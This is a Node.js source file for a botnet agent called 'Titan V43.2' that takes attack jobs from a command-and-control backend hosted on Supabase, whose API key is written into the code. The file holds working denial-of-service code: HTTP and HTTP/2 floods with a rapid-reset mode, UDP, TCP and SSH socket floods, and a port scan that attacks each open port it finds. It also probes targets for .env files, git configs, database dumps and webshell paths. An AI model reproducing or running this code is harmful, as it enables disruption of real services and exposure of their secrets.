/**
 * SECURITYFORGE TITAN AGENT V43.2 (FINAL VORTEX)
 * 
 * [PATCH LOG]
 * - FIXED: ERR_HTTP2_GOAWAY_SESSION (Auto-reconnect on server session termination)
 * - FEATURE: Dynamic Spider (Parses HTML for hidden paths)
 * - FEATURE: Deep Admin Hunter (50+ Dictionary Paths)
 * - FEATURE: Vortex Mode "100% Death" (IP Resolve -> Port Scan -> Auto-Targeting)
 */

const https = require('https');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const tls = require('tls');
const dgram = require('dgram');
const crypto = require('crypto');
const dns = require('dns');

// ==========================================
// 1. CONFIGURATION
// ==========================================
const C2_CONFIG = {
    url: "https://qbedywgbdwxaucimgiok.supabase.co",
    key: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo",
    pollInterval: 800,
    reportInterval: 2000
};

const STATE = {
    activeJob: null,
    running: false,
    stats: {
        totalReqs: 0,
        success: 0,
        failed: 0,
        latencySum: 0,
        latencyCount: 0,
        maxLatency: 0,
        startTime: 0
    },
    logs: [],
    priorityLogs: [],
    discovered: new Set(),
    activeTargets: new Set(), // Ports currently under attack
    resolvedIp: null,
    dynamicPaths: [], // Paths found via Spidering
    lastReport: 0
};

// ==========================================
// 2. INDUSTRIAL PAYLOADS
// ==========================================
const BUFFERS = {
    JUNK: Buffer.allocUnsafe(1400).fill('X'),
    MQTT_CONNECT: Buffer.from([0x10, 0x12, 0x00, 0x04, 0x4d, 0x51, 0x54, 0x54, 0x04, 0x02, 0x00, 0x3c, 0x00, 0x06, 0x63, 0x6c, 0x69, 0x65, 0x6e, 0x74]),
    MODBUS_QUERY: Buffer.from('00010000000601030000000a', 'hex'),
    COAP_PAYLOAD: Buffer.from('40011234', 'hex'),
    XML_BOMB: Buffer.from('<?xml version="1.0"?><!DOCTYPE l [<!ENTITY x "x"><!ENTITY y "&x;&x;&x;">]><r>&y;</r>')
};

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
];

// HTTP/1.1 Headers
const HTTP1_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': USER_AGENTS[0]
};

// HTTP/2 Headers (Strict)
const HTTP2_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'User-Agent': USER_AGENTS[0]
};

// Deep Dictionary for Static Recon
const DEEP_ADMIN_PATHS = [
    // Configs & Secrets
    '/.env', '/config.php', '/config.json', '/web.config', '/.git/config', '/.git/HEAD',
    '/docker-compose.yml', '/package.json', '/composer.json', '/secrets.yml',
    // Database
    '/backup.sql', '/database.sql', '/dump.sql', '/backup.zip', '/www.zip', '/site.tar.gz',
    // Admin Panels
    '/admin', '/wp-admin', '/administrator', '/dashboard', '/cpanel', '/phpmyadmin',
    '/adminer.php', '/login', '/user', '/member', '/api/health', '/telescope',
    '/horizon', '/jenkins', '/grafana', '/kibana', '/zabbix',
    // Backdoors / Shells
    '/shell.php', '/cmd.php', '/root.php', '/1.php', '/x.php', '/upl.php',
    '/api/.env', '/v1/.env', '/sftp-config.json'
];

// ==========================================
// 3. UTILITIES
// ==========================================
const log = (msg, type = 'INFO') => {
    const entry = `[${type}] ${msg}`;
    console.log(entry);
    if (type === 'SUCCESS' || type === 'FOUND' || type === 'OPEN' || type === 'ERROR') {
        STATE.priorityLogs.push(entry);
    } else {
        STATE.logs.push(entry);
    }
};

const makeSupabaseRequest = (method, path, body = null) => {
    return new Promise((resolve) => {
        const url = new URL(`${C2_CONFIG.url}/rest/v1/${path}`);
        const options = {
            hostname: url.hostname,
            path: url.pathname + url.search,
            method: method,
            headers: {
                'apikey': C2_CONFIG.key,
                'Authorization': `Bearer ${C2_CONFIG.key}`,
                'Content-Type': 'application/json',
                'Prefer': 'return=representation'
            }
        };
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => resolve(data ? JSON.parse(data) : null));
        });
        req.on('error', () => resolve(null));
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
};

const getTargetDetails = (urlStr) => {
    try {
        const u = new URL(urlStr.startsWith('http') ? urlStr : 'http://' + urlStr);
        return {
            host: u.hostname,
            port: u.port || (u.protocol === 'https:' ? 443 : 80),
            path: u.pathname,
            protocol: u.protocol.replace(':', ''),
            isSsl: u.protocol === 'https:'
        };
    } catch { return null; }
};

// ==========================================
// 4. CORE ATTACK ENGINES
// ==========================================

const runHttpFlood = (job, target) => {
    const lib = target.isSsl ? https : http;
    const agent = new lib.Agent({ keepAlive: true, maxSockets: Infinity, maxFreeSockets: 256 });
    
    const attack = () => {
        if (!STATE.running) return;
        
        // Spider Integration: Randomly pick a dynamically found path
        let path = target.path;
        if (STATE.dynamicPaths.length > 0 && Math.random() > 0.7) {
            path = STATE.dynamicPaths[Math.floor(Math.random() * STATE.dynamicPaths.length)];
        }
        
        const cb = job.use_chaos ? `?_=${Math.random().toString(36).slice(2)}` : '';
        
        const req = lib.request({
            host: target.host,
            port: target.port,
            path: path + cb,
            method: job.method,
            agent: agent,
            rejectUnauthorized: false,
            headers: HTTP1_HEADERS
        }, (res) => {
            STATE.stats.success++;
            res.resume();
            if (STATE.running) setImmediate(attack);
        });
        req.on('error', () => STATE.stats.failed++);
        if (job.method === 'POST') req.write(job.body || '{}');
        req.end();
    };
    for(let i=0; i<5; i++) attack(); 
};

// FIXED: Robust HTTP/2 with Error Handling for GOAWAY/Refused Stream
const runHttp2Flood = (job, target) => {
    if (!target.isSsl) return;
    
    const connect = () => {
        if (!STATE.running) return;
        
        const client = http2.connect(`https://${target.host}:${target.port}`, { 
            rejectUnauthorized: false, 
            peerMaxConcurrentStreams: 5000 
        });
        
        // Handle Session-Level Errors
        client.on('error', () => { 
            STATE.stats.failed++;
            // Reconnect handled by close/destroy logic below
        });
        
        client.on('goaway', () => {
            client.destroy(); // Server said stop, so we stop and let the loop reconnect
        });

        const spam = () => {
            if (!STATE.running) { client.destroy(); return; }

            if (client.destroyed || client.closed) {
                 setTimeout(connect, 200); // Reconnect
                 return;
            }
            
            // Batch requests
            for (let i=0; i<50; i++) {
                if (client.destroyed || client.closed) break;
                
                try {
                    const req = client.request({ 
                        ':path': target.path, 
                        ':method': job.method,
                        ...HTTP2_HEADERS 
                    });
                    req.on('response', () => STATE.stats.success++);
                    req.on('error', (err) => {
                        STATE.stats.failed++;
                        // Stream error, typically we just continue
                    });
                    req.end();
                    
                    // Rapid Reset Vector
                    if (job.use_god_mode) req.close(http2.constants.NGHTTP2_CANCEL);

                } catch (err) {
                    STATE.stats.failed++;
                    // Synchronous error (e.g., ERR_HTTP2_GOAWAY_SESSION) means session is dead.
                    // Destroy it to force a clean reconnect in the next tick.
                    client.destroy();
                    break; 
                }
            }
            
            if (STATE.running && !client.destroyed) setTimeout(spam, 10);
            else if (STATE.running) setTimeout(connect, 200);
        };
        spam();
    };
    connect();
};

// --- NETJAM & INFRA (RAW SOCKETS) ---
const runSocketStress = (job, target, type, portOverride = null) => {
    let port = portOverride;
    if (!port) {
        port = type === 'SSH' ? 22 : type === 'SMTP' ? 25 : type === 'DB' ? 3306 : type === 'DNS' ? 53 : target.port;
    }
    const dest = STATE.resolvedIp || target.host;

    if (type === 'UDP' || type === 'DNS') {
        const client = dgram.createSocket('udp4');
        const flood = () => {
            if (!STATE.running) { client.close(); return; }
            for(let i=0; i<50; i++) {
                client.send(BUFFERS.JUNK, port, dest, (err) => {
                    if(err) STATE.stats.failed++; else STATE.stats.success++;
                });
            }
            if(STATE.running) setImmediate(flood);
        };
        flood();
    } else {
        const attack = () => {
            if (!STATE.running) return;
            const s = new net.Socket();
            s.setTimeout(500);
            s.connect(port, dest, () => { 
                STATE.stats.success++; 
                if (type === 'SSH') s.write('SSH-2.0-Titan_Bot_V43\r\n');
                else s.write(BUFFERS.JUNK);
                s.destroy(); 
            });
            s.on('error', () => { STATE.stats.failed++; s.destroy(); });
            s.on('close', () => { if(STATE.running) setImmediate(attack); });
        };
        for(let i=0; i<5; i++) attack();
    }
};

// ==========================================
// 5. INTELLIGENCE (SPIDER & VORTEX)
// ==========================================

// --- DYNAMIC SPIDER (HTML PARSER) ---
const runSpider = (target) => {
    if (!STATE.running) return;
    const lib = target.isSsl ? https : http;
    
    lib.get({
        host: target.host, port: target.port, path: target.path, rejectUnauthorized: false, headers: HTTP1_HEADERS
    }, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
            const linkRegex = /(?:href|src|action)=["'](/[^"']+)["']/g;
            let match;
            let count = 0;
            while ((match = linkRegex.exec(body)) !== null) {
                const foundPath = match[1];
                if (!STATE.dynamicPaths.includes(foundPath) && foundPath.length < 100) {
                    STATE.dynamicPaths.push(foundPath);
                    count++;
                }
            }
            if (count > 0) log(`SPIDER: Extracted ${count} dynamic paths.`, 'INFO');
        });
    }).on('error', () => {});
    
    // Recurse occasionally to find new paths if page changes
    setTimeout(() => runSpider(target), 5000);
};

// --- ADMIN HUNTER (STATIC DICTIONARY) ---
const runAdminHunter = (target) => {
    if (!STATE.running) return;
    const lib = target.isSsl ? https : http;
    let pathIdx = 0;

    const crawl = () => {
        if (!STATE.running || pathIdx >= DEEP_ADMIN_PATHS.length) return;
        
        // Batch 5 paths
        for(let i=0; i<5 && pathIdx < DEEP_ADMIN_PATHS.length; i++) {
            const path = DEEP_ADMIN_PATHS[pathIdx++];
            const req = lib.get({
                host: target.host, port: target.port, path: path, rejectUnauthorized: false,
                headers: { 'User-Agent': USER_AGENTS[0] }
            }, (res) => {
                // If it's not a 404, we found something
                if (res.statusCode < 404 || res.statusCode === 401 || res.statusCode === 403) {
                    const msg = `HUNTER: FOUND ${path} [${res.statusCode}]`;
                    if(!STATE.discovered.has(msg)) { 
                        STATE.discovered.add(msg); 
                        log(msg, 'FOUND'); 
                        STATE.dynamicPaths.push(path); // Add to attack queue
                    }
                }
            });
            req.on('error', () => {});
            req.end();
        }
        setTimeout(crawl, 500);
    };
    crawl();
};

// --- VORTEX MODE (100% DEATH) ---
const runVortex = (job, target) => {
    log('VORTEX: Resolving Origin IP...', 'warning');
    
    // 1. Resolve IP
    dns.resolve4(target.host, (err, addresses) => {
        if (!err && addresses && addresses.length > 0) {
            STATE.resolvedIp = addresses[0];
            log(`VORTEX: LOCKED ON IP ${STATE.resolvedIp}`, 'SUCCESS');
            
            // 2. Scan Critical Ports
            const deathPorts = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 5432, 5900, 8000, 8080, 8443, 27017];
            log(`VORTEX: Scanning ${deathPorts.length} vectors on ${STATE.resolvedIp}...`, 'INFO');
            
            deathPorts.forEach(port => {
                const s = new net.Socket();
                s.setTimeout(2000);
                s.connect(port, STATE.resolvedIp, () => {
                    const msg = `VORTEX: OPEN PORT ${port} -> ENGAGING`;
                    if(!STATE.discovered.has(msg)) {
                        STATE.discovered.add(msg);
                        log(msg, 'OPEN');
                        
                        const attackType = (port === 53) ? 'DNS' : (port === 22) ? 'SSH' : 'TCP';
                        // Spawn 20 threads per open port
                        for(let k=0; k<20; k++) runSocketStress(job, target, attackType, port);
                    }
                    s.destroy();
                });
                s.on('error', () => s.destroy());
            });
        } else {
            log('VORTEX: DNS Resolution Failed. Falling back to Domain URL.', 'ERROR');
        }
    });
};

// ==========================================
// 6. MAIN LOGIC
// ==========================================
const startJob = (job) => {
    if (STATE.running) return;
    STATE.activeJob = job;
    STATE.running = true;
    STATE.stats = { totalReqs: 0, success: 0, failed: 0, latencySum: 0, latencyCount: 0, maxLatency: 0, startTime: Date.now() };
    STATE.discovered.clear();
    STATE.activeTargets.clear();
    STATE.dynamicPaths = [];
    STATE.resolvedIp = null;
    
    log(`TITAN V43.2 | TARGET: ${job.target} | METHOD: ${job.method}`);
    const target = getTargetDetails(job.target);
    if (!target) return;

    // --- RECON PHASE ---
    if (job.use_100_percent_death) {
        log('WARNING: 100% DEATH (VORTEX) MODE ENGAGED.', 'warning');
        runVortex(job, target);     // IP + Port Scan + Attack
        runSpider(target);          // Dynamic HTML
        runAdminHunter(target);     // Static Dictionary
    } else {
        if (job.use_admin_hunter) {
            runSpider(target);      // Dynamic HTML
            runAdminHunter(target); // Static Dictionary
        }
    }

    // --- MAIN ATTACK THREADS ---
    // These run in parallel to VORTEX threads to ensure URL is hit even if ports are closed
    const threads = Math.min(job.concurrency || 50, 500);

    for (let i = 0; i < threads; i++) {
        if (job.use_syn_flood) runSocketStress(job, target, 'TCP');
        else if (job.method === 'UDP') runSocketStress(job, target, 'UDP');
        else if (job.use_http2) runHttp2Flood(job, target);
        else runHttpFlood(job, target);
    }
};

const stopJob = () => {
    STATE.running = false;
    log("ENGINE STOPPED");
};

// Loop and Server Setup
setInterval(async () => {
    if (STATE.running && STATE.activeJob) {
        const now = Date.now();
        const elapsed = (now - STATE.stats.startTime) / 1000;
        
        if (now - STATE.lastReport > C2_CONFIG.reportInterval) {
            const rps = STATE.stats.success / (elapsed || 1); 
            const avgLat = STATE.stats.latencyCount > 0 ? (STATE.stats.latencySum / STATE.stats.latencyCount) : 0;
            
            if (STATE.activeJob.duration && elapsed > STATE.activeJob.duration) {
                await makeSupabaseRequest('PATCH', `jobs?id=eq.${STATE.activeJob.id}`, { status: 'COMPLETED' });
                stopJob();
                return;
            }

            const payload = {
                current_rps: Math.round(rps),
                avg_latency: Math.round(avgLat),
                max_latency: Math.round(STATE.stats.maxLatency),
                total_success: STATE.stats.success,
                total_failed: STATE.stats.failed
            };
            
            if (STATE.priorityLogs.length > 0 || STATE.logs.length > 0) {
                 const combined = [...STATE.priorityLogs, ...STATE.logs].slice(0, 50);
                 payload.logs = JSON.stringify(combined);
                 STATE.priorityLogs = [];
                 STATE.logs = [];
            }

            const res = await makeSupabaseRequest('PATCH', `jobs?id=eq.${STATE.activeJob.id}`, payload);
            if (res && res[0] && res[0].status === 'STOPPED') stopJob();
            STATE.lastReport = now;
        }
    } else {
        const jobs = await makeSupabaseRequest('GET', 'jobs?status=eq.PENDING&limit=1&select=*');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            await makeSupabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startJob(job);
        }
    }
}, C2_CONFIG.pollInterval);

http.createServer((req, res) => res.end('Titan V43.2 Vortex Stable')).listen(process.env.PORT || 3000);
console.log('SecurityForge Titan Agent V43.2 (Vortex Stable) Online');
